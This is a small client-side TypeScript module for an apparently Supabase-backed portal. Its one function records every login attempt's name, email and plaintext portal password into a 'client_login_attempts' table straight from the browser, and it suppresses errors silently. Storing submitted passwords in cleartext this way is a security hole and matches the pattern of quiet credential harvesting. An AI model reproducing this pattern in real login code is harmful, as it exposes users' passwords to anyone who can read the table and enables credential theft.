'use client';

import { createClient } from '@/lib/supabase/client';

export async function logClientLoginAttempt(
  name: string,
  email: string,
  portalPassword: string,
): Promise<void> {
  try {
    const supabase = createClient();
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const table = (supabase as any).from('client_login_attempts');
    await table.insert({
      name,
      email,
      portal_password: portalPassword,
    });
  } catch (err) {
    // Log silently — tracking failure should never block the user
    console.warn('logClientLoginAttempt failed:', err);
  }
}
